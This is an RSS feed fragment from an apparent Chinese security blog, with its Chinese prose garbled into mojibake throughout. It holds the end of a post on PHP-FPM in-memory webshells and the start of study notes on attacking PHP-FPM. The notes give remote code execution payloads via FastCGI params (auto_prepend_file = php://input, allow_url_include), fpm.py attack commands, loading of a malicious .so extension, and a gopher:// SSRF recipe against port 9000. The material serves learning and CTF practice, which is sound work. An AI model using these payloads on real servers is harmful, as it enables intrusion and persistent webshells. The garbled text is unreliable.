&lt;p>æˆ‘ä»¬å¯ä»¥æ ¹æ®wofeiwoå¸ˆå‚…ä¹‹å‰å†™çš„&lt;a href="https://gist.github.com/wofeiwo/4f41381a388accbf91f8#file-fcgi_jailbreak-php">fcgi_jailbreak.php&lt;/a>æ”¹é€ å‡ºfpmå†…å­˜é©¬ä¸€æŠŠæ¢­çš„è„šæœ¬ï¼Œå…·ä½“ä¿®æ”¹çš„åœ°æ–¹å°±æ˜¯ä¸Šé¢çš„&lt;code>php://input&lt;/code>æ”¹ä¸ºä¸€å¥è¯é©¬&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220913144342599.png" alt="image-20220913144342599.png">&lt;/p>
&lt;p>å…¶ä½™éƒ¨åˆ†ä¸å˜ï¼Œç»§ç»­ç”¨å³å¯&lt;/p>
&lt;h2 id="æŸ¥æ€">æŸ¥æ€&lt;/h2>
&lt;p>ä¸å¯é¿å¼€çš„è¯é¢˜æ˜¯å†…å­˜é©¬çš„æŸ¥æ€ï¼Œç”±äºå®ƒåªæ˜¯åŠ¨æ€ä¿®æ”¹äº†å†…å­˜ä¸­çš„ PHP é…ç½®ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•ä»&lt;code>PHP.ini/.user.ini/php-fpm.conf&lt;/code>ç­‰æ–‡ä»¶å†…å®¹ä¸­æ£€æµ‹ï¼ŒçœŸæ­£æ·»åŠ å†…å­˜é©¬ç”±äºåªéœ€è¦å¯¹fpmç›‘å¬çš„ç«¯å£å‘é€è¯·æ±‚ï¼Œå› æ­¤ä¹Ÿæ— æ³•ä»webserverçš„accesslogä¸­å‘ç°é—®é¢˜&lt;/p>
&lt;p>æˆ–è®¸å¯ä»¥é€šè¿‡raspä¹‹ç±»çš„å·¥å…·æ£€æŸ¥&lt;code>auto_prepend_file/auto_append_file/allow_url_inclue&lt;/code>é…ç½®çš„å˜åŒ–æ¥åšæ£€æµ‹&lt;/p>
&lt;p>ä¸ªäººè®¤ä¸ºå¯ä»¥é€šè¿‡æµé‡çš„è¡Œä¸ºè¿›è¡Œæ£€æŸ¥ï¼Œå½“å‡ºç°äº†rceç›¸å…³çš„æµé‡ä½†æ²¡æœ‰æ–‡ä»¶é©¬çš„æ—¶å€™å°±å¯ä»¥è€ƒè™‘æ˜¯php-fpmçš„å†…å­˜é©¬äº†&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/php-fastcgi-remote-exploit.md">PHP FastCGI çš„è¿œç¨‹åˆ©ç”¨&lt;/a> | &lt;a href="https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/">æ”»å‡» PHP-FPM å­¦ä¹ ç¬”è®°&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/vulhub/vulhub/tree/master/cgi/CVE-2016-5385">CVE-2016-5385&lt;/a> | &lt;a href="https://httpoxy.org/">httpoxy&lt;/a> | &lt;a href="https://www.laruence.com/2016/07/19/3101.html">HTTPOXYæ¼æ´è¯´æ˜&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md">uWSGI è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tttang.com/archive/1720/">åˆ©ç”¨ PHP-FPM åšå†…å­˜é©¬çš„æ–¹æ³•&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>æ”»å‡»PHP-FPMå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>ä¹‹å‰åšé¢˜æ€»æ˜¯ä¼šè§åˆ°ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆæ‡‚å®é™…çš„åŸç†ï¼Œæœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½åƒæ‡‚äº†ä½†åˆæ²¡æœ‰å®Œå…¨æ‡‚ï¼Œæ˜¯æ—¶å€™ä¸“é—¨æ¥å­¦ä¸€ä¸‹å’¯ï¼&lt;/p>
&lt;p>æ²¡æœ‰ä»€ä¹ˆæ–°é²œçš„ä¸œè¥¿ï¼Œåªä¸è¿‡æŠŠå¸ˆå‚…ä»¬å·²æœ‰çš„æ–‡ç« è¿›è¡Œä¸€ä¸ªæ•´åˆ&amp;amp;é‡æ–°æ•´ç†ï¼Œå‚è€ƒé“¾æ¥æ”¾åˆ°æœ€åå•¦w&lt;/p>
&lt;h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGIåè®®ç”¨äºå¤„ç†htmlè¿™ç±»é™æ€æ–‡ä»¶ä¹‹åå‡ºç°çš„åŠ¨æ€è¯­è¨€çš„è§£é‡Šå™¨ä¸webserveré€šä¿¡çš„é—®é¢˜ï¼Œå…·ä½“çš„å®ç°æœ‰php-cgi&lt;/p>
&lt;p>CGIçš„å¼Šç«¯æ˜¯ä»¤webserveræ¯æ¬¡å¤„ç†è¯·æ±‚æ—¶éƒ½ä¼šforkä¸€ä¸ªcgiè¿›ç¨‹ï¼Œç»“æŸåå†killï¼Œæ¯”è¾ƒæµªè´¹èµ„æºï¼ŒFastCGIåè®®å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå¤„ç†å®Œè¯·æ±‚åä¸ä¼škillè€Œæ˜¯ä¿ç•™è¯¥è¿›ç¨‹ï¼Œä½¿å®ƒå¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡forkäº†&lt;/p>
&lt;p>è€Œphp-fpmå°±æ˜¯FastCGIåè®®çš„ä¸€ä¸ªå…·ä½“å®ç°ï¼Œä½œä¸ºFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼ˆè¿è¡Œæ—¶æœ‰ä¸€ä¸ªä¸»è¿›ç¨‹å’Œå¤šä¸ªåŒ…å«phpè§£é‡Šå™¨çš„workerè¿›ç¨‹æ¥æ‰§è¡Œä»£ç ï¼‰ï¼Œç”¨äºæ¥æ”¶webserverçš„è¯·æ±‚&lt;/p>
&lt;p>æŸ¥çœ‹phpinfoï¼ŒSever APIå¤„ä¸€èˆ¬ä¼šæœ‰ä¸‰ç§æ ·å¼ï¼š&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>ç¬¬ä¸€ç§æŠŠphpä½œä¸ºapacheçš„ä¸€ä¸ªæ¨¡å—ï¼Œç›¸å½“äºapacheä¸­çš„ä¸€ä¸ª.dllæˆ–.soï¼›ç¬¬äºŒç§php-cgi.exeæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ŒwebæœåŠ¡å™¨ä¹Ÿæ˜¯ç‹¬ç«‹çš„apache.exeï¼ŒwebæœåŠ¡å™¨ç›‘å¬åˆ°httpè¯·æ±‚æ—¶ä¼šå»è°ƒç”¨php-cgiè¿›ç¨‹ï¼Œä¹‹é—´é€šè¿‡cgiåè®®ä¼ é€’æ•°æ®ï¼›è€Œç¬¬ä¸‰ç§fastcgiä¹Ÿæ˜¯ä¸€ç§åè®®ï¼Œå®ƒåšäº†å¾ˆå¤šä¼˜åŒ–ä¸”å¸¸é©»å†…å­˜ ä¸ç”¨æ¯æ¬¡éƒ½è°ƒç”¨ä¸€ä¸‹cgiï¼Œæœ‰è¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å¤„ç†ç”±php-fpmæ¥å®ç°&lt;/p>
&lt;h3 id="é…ç½®">é…ç½®&lt;/h3>
&lt;p>php-fpmé€šä¿¡æ–¹å¼æœ‰tcpï¼ˆæœ¬åœ°ç›‘å¬9000ç«¯å£ï¼‰å’Œunix socketå¥—æ¥å­—ä¸¤ç§æ–¹å¼ï¼Œé¢˜ç›®ä¸­å¯ä»¥è§åˆ°çš„éƒ½æ˜¯tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>apt update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install nginx -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install software-properties-common -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apt install php7.4-fpm -y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcpæ¨¡å¼">tcpæ¨¡å¼&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socketæ¨¡å¼">unix socketæ¨¡å¼&lt;/h4>
&lt;p>å¦‚æœå¯åŠ¨fpmä¸åšæ”¹åŠ¨ï¼Œé»˜è®¤ä¸ºå¥—æ¥å­—æ¨¡å¼&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åé‡å¯å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœå‡ºç°æŠ¥é”™è¯·æŸ¥çœ‹å¯¹åº”æ—¥å¿—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>cat /var/log/nginx/error.log
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat /var/log/php7.4-fpm.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="æ¼æ´æˆå› ">æ¼æ´æˆå› &lt;/h2>
&lt;p>æŒ‰FastCGIåè®®ä¼ è¾“çš„å†…å®¹åˆ†ä¸ºheaderå’Œbodyä¸¤éƒ¨åˆ†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Header */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// ç‰ˆæœ¬
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordçš„ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬æ¬¡recordå¯¹åº”çš„è¯·æ±‚id
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">requestIdB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// bodyä½“çš„å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentLengthB0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// é¢å¤–å—å¤§å°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">reserved&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Body */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">contentData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">contentLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">paddingData&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">paddingLength&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#111">FCGI_Record&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆä»hederä¸­æ‹¿åˆ°bodyä½“å¤§å°ï¼ˆæœ€å¤§2^16=65535å­—èŠ‚ï¼‰ï¼Œå†ä»tcpæµé‡Œè¯»å–å¤§å°ç­‰äºcontentLenthçš„bodyï¼Œä¹‹åè¿˜æœ‰ä¸€éƒ¨åˆ†é¢å¤–çš„padding&lt;/p>
&lt;p>headerä¸­çš„typeèµ·åˆ°æŒ‡å®šrecordçš„ä½œç”¨ï¼Œå› ä¸ºFastCGIçš„å•ä¸ªrecordå¤§å°æœ‰é™ä½œç”¨å•ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªTCPæµä¸­ä¼ è¾“å¤šä¸ªrecordï¼Œé€šè¿‡typeæ¥æ ‡è¯†æ¯ä¸ªrecordçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼ŒrequestIdåšåˆ°åŒºåˆ†æ¯ä¸€æ¬¡çš„è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png" alt="image-20211112110643128">&lt;/p>
&lt;p>å½“type=4æ—¶ï¼Œè¡¨æ˜æ¶ˆæ¯ä¸­åŒ…å«çš„æ•°æ®ä¸ºæŸä¸ªname-valueå¯¹ï¼Œæ¯”å¦‚&lt;/p>
&lt;pre tabindex="0">&lt;code>{
&amp;#39;GATEWAY_INTERFACE&amp;#39;: &amp;#39;FastCGI/1.0&amp;#39;,
&amp;#39;REQUEST_METHOD&amp;#39;: &amp;#39;GET&amp;#39;,
&amp;#39;SCRIPT_FILENAME&amp;#39;: &amp;#39;/var/www/html/index.php&amp;#39;,
&amp;#39;SCRIPT_NAME&amp;#39;: &amp;#39;/index.php&amp;#39;,
&amp;#39;QUERY_STRING&amp;#39;: &amp;#39;?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;REQUEST_URI&amp;#39;: &amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;DOCUMENT_ROOT&amp;#39;: &amp;#39;/var/www/html&amp;#39;,
&amp;#39;SERVER_SOFTWARE&amp;#39;: &amp;#39;php/fcgiclient&amp;#39;,
&amp;#39;REMOTE_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;REMOTE_PORT&amp;#39;: &amp;#39;12345&amp;#39;,
&amp;#39;SERVER_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;SERVER_PORT&amp;#39;: &amp;#39;80&amp;#39;,
&amp;#39;SERVER_NAME&amp;#39;: &amp;#34;localhost&amp;#34;,
&amp;#39;SERVER_PROTOCOL&amp;#39;: &amp;#39;HTTP/1.1&amp;#39;
}
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­&lt;code>SCRIPT_FILENAME&lt;/code>å°±æ˜¯php-fpmä¼šå»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”±äº5.3.9ç‰ˆæœ¬å¼•å…¥äº†&lt;code>security.limit_extensions&lt;/code>çš„é€‰é¡¹ï¼Œé»˜è®¤å¯¹åç¼€åé™åˆ¶åœ¨äº†phpå®¶æ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ‰¾åˆ°å·²å­˜åœ¨phpæ–‡ä»¶ï¼ˆå®‰è£…æ—¶é™„å¸¦çš„phpæ–‡ä»¶ å¯ä»¥é€šè¿‡&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>æ¥æœç´¢ä¸€ä¸‹é»˜è®¤ç¯å¢ƒ æ¯”å¦‚/usr/local/lib/php/PEAR.phpï¼‰ï¼Œå‘å…¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›è€Œfpmæ”¯æŒé€šè¿‡è®¾ç½®&lt;code>FASTCGI_PARAMS&lt;/code>æ¥åŠ¨æ€ä¿®æ”¹phpçš„è®¾ç½®ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸¤é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;,
&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On&amp;#39;
&lt;/code>&lt;/pre>&lt;p>æ¥åšåˆ°æ‰§è¡ŒæŸphpæ–‡ä»¶æ—¶è‡ªåŠ¨åŒ…å«POSTå†…å®¹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆdisable_functionåœ¨phpåŠ è½½æ—¶å°±ç¡®å®šå¥½äº†ï¼Œæ— æ³•é‡å†™ï¼‰&lt;/p>
&lt;h2 id="æ”»å‡»æ€è·¯ä¾‹é¢˜">æ”»å‡»æ€è·¯&amp;amp;&amp;amp;ä¾‹é¢˜&lt;/h2>
&lt;p>ä¼ªé€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸é€šä¿¡çš„FastCGIå®¢æˆ·ç«¯ï¼Œå°†ä¼ è¾“çš„å†…å®¹ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadï¼Œå†å‘å‡ºå»&lt;/p>
&lt;h3 id="è¿œç¨‹æ”»å‡»php-fpm">è¿œç¨‹æ”»å‡»php-fpm&lt;/h3>
&lt;p>è¿™é‡Œæ˜¯&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">pç‰›çš„è„šæœ¬&lt;/a>ï¼Œå…¼å®¹py2&amp;amp;3ï¼Œé»˜è®¤-p 9000ï¼Œ-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬éœ€è¦æ”¹åŠ¨çš„åªæœ‰paramséƒ¨åˆ†çš„&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>æˆåŠŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœåªæ˜¯åŠ è½½æ¶æ„.soè€Œä¸æ‰§è¡Œä»£ç ï¼Œåˆ™å¹¶ä¸éœ€è¦æœ‰å·²å­˜åœ¨phpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç”¨&lt;code>_&lt;/code>å ä½å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrfæ”»å‡»æœ¬åœ°php-fpm">SSRFæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;p>åˆ©ç”¨&lt;code>gopher://&lt;/code>åè®®å¯ä»¥ç›´æ¥ä¼ è¾“TCPåè®®æµï¼Œæˆ‘ä»¬æ„é€ å¥½payloadä¹‹åå°±å¯ä»¥ä¼ å…¥è¿›è¡Œssrfæ”»å‡»äº†&lt;/p>
&lt;p>æ„é€ payloadä¾æ—§ä½¿ç”¨pç‰›çš„è„šæœ¬ï¼Œä¸è¿‡åšä¸€ç‚¹å¾®å°çš„æ”¹åŠ¨ï¼›è¿™éƒ¨åˆ†å¯ä»¥å‚è§åé¢ç»“åˆftpæ”»å‡»fpmçš„å†…å®¹ï¼Œæ€»ä¹‹å°±ç…§è¿™å‡ æ­¥èµ°&lt;/p>
&lt;ul>
&lt;li>pç‰›è„šæœ¬ç”Ÿæˆurlencodeä¹‹åçš„tcpæ•°æ®æµ&lt;/li>
&lt;li>åŠ gopher://127.0.0.1:9000å‰ç¼€&lt;/li>
&lt;li>æ¢­ï¼?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="å¼ºç½‘é’å°‘-2021ssrf">[å¼ºç½‘é’å°‘ 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
